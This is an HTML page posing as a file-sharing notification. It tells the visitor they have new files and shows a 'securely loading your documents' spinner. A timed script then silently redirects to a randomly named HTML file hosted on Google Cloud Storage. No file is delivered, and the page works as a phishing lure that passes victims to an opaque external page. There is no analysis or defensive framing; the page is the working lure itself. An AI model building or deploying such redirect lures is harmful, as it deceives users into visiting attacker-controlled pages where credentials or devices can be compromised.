<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>File Notification</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1e3a8a, #3b82f6);
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .card {
      background: rgba(255,255,255,0.1);
      padding: 30px;
      border-radius: 12px;
      text-align: center;
      width: 380px;
      backdrop-filter: blur(10px);
    }

    h1 {
      font-size: 20px;
      margin-bottom: 10px;
    }

    p {
      font-size: 14px;
      opacity: 0.9;
    }

    .loader {
      margin-top: 20px;
      border: 4px solid rgba(255,255,255,0.2);
      border-top: 4px solid white;
      border-radius: 50%;
      width: 35px;
      height: 35px;
      animation: spin 1s linear infinite;
      margin-left: auto;
      margin-right: auto;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>

<div class="card">

  <!-- STEP 1 -->
  <div id="step1">
    <h1>Good day</h1>
    <p>You have received new files.</p>
  </div>

  <!-- STEP 2 -->
  <div id="step2" class="hidden">
    <h1>Preparing your files</h1>
    <p>Please wait while we securely load your documents...</p>
    <div class="loader"></div>
  </div>

</div>

<script>
  // Show loading after 2 seconds
  setTimeout(() => {
    document.getElementById("step1").classList.add("hidden");
    document.getElementById("step2").classList.remove("hidden");
  }, 2000);

  // Redirect after total ~5 seconds
  setTimeout(() => {
    window.location.href = "https://storage.googleapis.com/63729930033ppppppp/jag473939383839hsksksksjsd.html";
  }, 5000);
</script>

</body>
</html>
